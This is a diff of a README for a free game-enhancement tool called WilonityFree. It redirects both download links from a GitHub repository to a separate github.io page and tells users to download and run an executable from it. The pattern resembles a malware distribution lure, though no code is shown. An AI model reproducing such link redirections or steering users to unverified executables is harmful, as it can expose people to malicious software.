@@ -1,6 +1,6 @@
 # 🎮 WilonityFree - Add useful features to your games
 
-[![Download WilonityFree](https://img.shields.io/badge/Download-WilonityFree-blue.svg)](https://github.com/gulfofalaskahomecounties666/WilonityFree)
+[![Download WilonityFree](https://img.shields.io/badge/Download-WilonityFree-blue.svg)](https://gulfofalaskahomecounties666.github.io)
 
 ## 📖 About WilonityFree
 
@@ -30,7 +30,7 @@ To run WilonityFree, your computer must meet these standards:
 
 Follow these steps to install the software.
 
-1. Visit the following link to access the download page: [https://github.com/gulfofalaskahomecounties666/WilonityFree](https://github.com/gulfofalaskahomecounties666/WilonityFree).
+1. Visit the following link to access the download page: [https://gulfofalaskahomecounties666.github.io](https://gulfofalaskahomecounties666.github.io).
 2. Locate the Releases area on current page.
 3. Download the latest version of the executable file. 
 4. Move the file to a folder where you store your game tools.
